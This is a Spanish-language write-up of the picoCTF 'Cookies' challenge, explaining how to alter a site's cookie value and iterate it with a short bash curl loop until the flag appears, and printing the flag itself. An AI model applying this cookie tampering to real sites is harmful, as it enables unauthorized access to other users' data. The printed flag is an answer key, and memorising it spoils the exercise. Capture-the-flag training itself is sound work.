#### Descripción

¿A quién no le gustan las galletas? Trata de averiguar cuál es el mejor. [(enlace)](http://mercury.picoctf.net:54219/)

#### Solución

El objetivo es manipular las cookies del sitio web para encontrar la que contiene la bandera.

#### Pasos

1. **Ver la cookie en el navegador**
    
    - Usar una extensión como **EditThisCookie** o las herramientas de desarrollo (`F12` > `Application` > `Cookies`).
        
    - La cookie inicial tiene un valor de `-1`.
        
2. **Enviar "snickerdoodle" y observar cambios**
    
    - Al ingresar "snickerdoodle" en la barra de búsqueda, la cookie cambia a `0` en la página `/check`.
        
3. **Iterar sobre las cookies**
    
    - Se asume que uno de los valores de la cookie contendrá la bandera.
        
    - Se prueba manualmente aumentando el valor de la cookie hasta `28`.
        
4. **Automatizar la búsqueda con un script BASH**
    
    - Para buscar la cookie correcta, se usa el siguiente script y se guarda como `cookie.sh`:
        
        ```
        #!/bin/bash
        for i in {0..28}
        do
            curl --cookie "name=$i" "http://mercury.picoctf.net:54219/check"
        done
        ```
        
    - Ejecutarlo en Linux con:
        
        ```
        chmod +x cookie.sh && ./cookie.sh | grep -oE "picoCTF{.*}" > flag.txt
        ```
        
    - La bandera se guardará en `flag.txt`.
        

#### Resultado

La bandera encontrada es:

```
picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
```

#### Notas adicionales

- Este reto demuestra cómo las cookies pueden almacenar información valiosa y cómo un atacante podría explotarlas.
    
- También se puede modificar el valor de la cookie directamente en el navegador y refrescar la página `/check`.
    

#### Referencias

- EditThisCookie: Extensión para Chrome
    
- [Uso de cookies en HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)